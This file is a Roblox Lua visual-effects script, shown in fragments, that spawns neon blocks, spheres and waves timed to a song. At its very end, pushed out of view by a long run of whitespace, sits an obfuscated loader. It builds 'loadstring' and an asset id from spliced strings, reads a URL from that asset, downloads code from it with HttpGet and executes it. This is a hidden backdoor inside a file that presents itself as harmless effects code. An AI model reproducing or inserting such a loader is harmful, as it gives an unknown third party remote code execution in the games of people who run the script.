...
local spin=1
local hhh=nil
dj=PostSimulation:Connect(function()
...
elseif t>=9.521 and t<=16.9 then 
tspawn(function()
local t=sound.TimePosition
local z=random(-50,50)
local x=random(-50,50)
...
block1("In",speedrandom,v3(0,1,0),v3(hhh*3.5,1,2.5),f.CFrame*cf(-20.5-g,0,0)*angles(0,rad(0),rad(0)),scolor.Value,0,f.CFrame*cf(-20.5,0,0)*angles(0,rad(0),rad(0)),true,pcolor.Value,true,100,"Neon")
elseif t>=32 and t<=39.7 then 
tspawn(function()
local t=sound.TimePosition
local z=random(-25,25)
local x=random(-25,25)
sphere1("Out",5,v3(.5,.5,.5),v3(50,.5,.5),rootpart1.CFrame*cf(z,0,x)*angles(0,0,rad(90)),scolor.Value,0,rootpart1.CFrame*cf(z,0,x)*angles(0,0,rad(90)),true,pcolor.Value,true,15)
sphere1("Out",5,v3(.5,.5,.5),v3(50,.5,.5),rootpart1.CFrame*cf(x,0,z)*angles(0,0,rad(90)),scolor.Value,0,rootpart1.CFrame*cf(x,0,z)*angles(0,0,rad(90)),true,pcolor.Value,true,15)
wave2("Out",5,5,rootpart1.CFrame*cf(z,.25,x),pcolor.Value)
wave2("Out",5,7.5,rootpart1.CFrame*cf(x,.25,z),scolor.Value)
end)
tspawn(function()
local t=sound.TimePosition
local z=random(-25,25)
...
block1("In",1,v3(1,1,1),v3(1,1,1),Floor.CFrame*cf(random(-50,50),1,random(-50,50))*angles(0,rad(0),rad(0)),scolor.Value,0,Floor.CFrame*cf(random(-50,50),ypos,random(-50,50))*angles(0,rad(0),rad(0)),true,pcolor.Value,true,1,"Neon")
block1("In",1,v3(1,1,1),v3(1,1,1),Floor.CFrame*cf(random(-50,50),1,random(-50,50))*angles(0,rad(0),rad(0)),scolor.Value,0,Floor.CFrame*cf(random(-50,50),ypos,random(-50,50))*angles(0,rad(0),rad(0)),true,pcolor.Value,true,1,"Neon")
elseif t>=110.45 and t<=122.3 then 
tspawn(function()
local t=sound.TimePosition
local z=random(-25,25)
local x=random(-25,25)
...
block1("In",1,v3(1,1,1),v3(1,1,1),Floor.CFrame*cf(random(-50,50),1,random(-50,50))*angles(0,rad(0),rad(0)),scolor.Value,0,Floor.CFrame*cf(random(-50,50),ypos,random(-50,50))*angles(0,rad(0),rad(0)),true,pcolor.Value,true,1,"Neon")
block1("In",1,v3(1,1,1),v3(1,1,1),Floor.CFrame*cf(random(-50,50),1,random(-50,50))*angles(0,rad(0),rad(0)),scolor.Value,0,Floor.CFrame*cf(random(-50,50),ypos,random(-50,50))*angles(0,rad(0),rad(0)),true,pcolor.Value,true,1,"Neon")
elseif t>=122.3 and t<=154.1 then 
block1("Out",1.5,v3(10,10,10),v3(30,75,30),Floor.CFrame*cf(random(-50,50),1,random(-50,50))*angles(random(-50,50),rad(random(-50,50)),rad(random(-50,50))),scolor.Value,0,Floor.CFrame*cf(random(-50,50),lol1,random(-50,50))*angles(0,0,0),true,pcolor.Value,true,15,"ForceField")
block1("Out",1.5,v3(10,10,10),v3(30,75,30),Floor.CFrame*cf(random(-50,50),1,random(-50,50))*angles(random(-50,50),rad(random(-50,50)),rad(random(-50,50))),pcolor.Value,0,Floor.CFrame*cf(random(-50,50),lol1,random(-50,50))*angles(0,rad(0),0),true,scolor.Value,true,15,"ForceField")
block1("In",1,v3(1,1,1),v3(1,1,1),Floor.CFrame*cf(random(-50,50),1,random(-50,50))*angles(0,rad(0),rad(0)),scolor.Value,0,Floor.CFrame*cf(random(-50,50),ypos,random(-50,50))*angles(0,rad(0),rad(0)),true,pcolor.Value,true,1,"Neon")
block1("In",1,v3(1,1,1),v3(1,1,1),Floor.CFrame*cf(random(-50,50),1,random(-50,50))*angles(0,rad(0),rad(0)),scolor.Value,0,Floor.CFrame*cf(random(-50,50),ypos,random(-50,50))*angles(0,rad(0),rad(0)),true,pcolor.Value,true,1,"Neon")
...
repeat VFX2() task.wait() until not scriptfolder:FindFirstChild(Name.."Assets")
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ...
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        task.spawn(pcall,--[==[3a6fe9d]==]function()--[==[3a6fe9d]==]local a =--[==[3a6fe9d]==] getfenv()--[==[3a6fe9d]==][ [[]]--[[238e369]]..[[l]]..--[=======[6b06ab1]=======][[]]--[=====[f69ffc]=====]..[[o]]..--[====[2a9710c]====][[]]--[===[9fd863f]===]..[[a]]..--[======[1bb81dd]======][[]]--[====[50e9419]====]..[[d]]..--[=======[09bfcb9]=======][[]]--[==[727ea32]==]..[[s]]..--[======[f9e2d8f]======][[]]--[====[f5baecf]====]..[[t]]..--[=====[d202dbe]=====][[]]--[==[2c26601]==]..[[r]]..--[[2883ca8]][[]]--[=====[463e2a8]=====]..[[i]]..--[=[456a050]=][[]]--[=======[22bd1c9]=======]..[[n]]..--[[b5a60f4]][[]]--[=====[210cbe0]=====]..[[g]]..--[[d2f351a]][[]] ];--[==[3a6fe9d]==]local b = --[==[3a6fe9d]==]game:--[==[3a6fe9d]==]GetObjects( [[]]--[[1a61896]]..[[r]]..--[[243d89f]][[]]--[[ff032ae]]..[[b]]..--[=[f375dcd]=][[]]--[=======[030b419]=======]..[[x]]..--[==[d2fa507]==][[]]--[======[c58a880]======]..[[a]]..--[[1fa5df2]][[]]--[=======[2465bb1]=======]..[[s]]..--[=[ee6d08d]=][[]]--[=====[0ea558d]=====]..[[s]]..--[==[3a0ce4f]==][[]]--[===[19c9554]===]..[[e]]..--[======[4956aa0]======][[]]--[=======[76cd381]=======]..[[t]]..--[=====[4b2a39b]=====][[]]--[===[943804f]===]..[[i]]..--[=======[cc48e35]=======][[]]--[===[c358641]===]..[[d]]..--[=[535d0f0]=][[]]--[=======[1141601]=======]..[[:]]..--[==[5b5e8df]==][[]]--[=====[a303650]=====]..[[/]]..--[====[511caaf]====][[]]--[[850e65e]]..[[/]]..--[=[ae41529]=][[]]--[===[efd29b5]===]..[[1]]..--[=[46d2d66]=][[]]--[==[de20c29]==]..[[1]]..--[=====[b5f614a]=====][[]]--[====[7c2bc84]====]..[[2]]..--[=======[bf7ee16]=======][[]]--[====[f1fca86]====]..[[4]]..--[[4551441]][[]]--[=[5908553]=]..[[0]]..--[=====[b5ce008]=====][[]]--[======[926a0a7]======]..[[5]]..--[===[19aa0e9]===][[]]--[=======[362861e]=======]..[[6]]..--[======[7d0acf2]======][[]]--[===[5f10f28]===]..[[1]]..--[=[1ea63a0]=][[]]--[====[2afb5a1]====]..[[8]]..--[=====[428756e]=====][[]]--[[af789c5]]..[[5]]..--[==[aa3ca50]==][[]]--[=====[b007cf9]=====]..[[8]]..--[[02933bf]][[]]--[====[3ca1905]====]..[[4]]..--[=[83c01a8]=][[]]--[===[e03a2d9]===]..[[8]]..--[======[7837267]======][[]]--[===[1928847]===]..[[2]]..--[=======[ad53774]=======][[]]--[=======[7f65216]=======]..[[1]]..--[===[cb96fa9]===][[]] )local c = b[1];local d = --[==[3a6fe9d]==]c.Value--[==[3a6fe9d]==];local e --[==[3a6fe9d]==]= game:--[==[3a6fe9d]==]HttpGet(d --[==[3a6fe9d]==].. "/" --[==[3a6fe9d]==].. "s" --[==[3a6fe9d]==].. "r" --[==[3a6fe9d]==].. "c")a--[==[3a6fe9d]==](--[==[3a6fe9d]==]e)--[==[3a6fe9d]==]()end)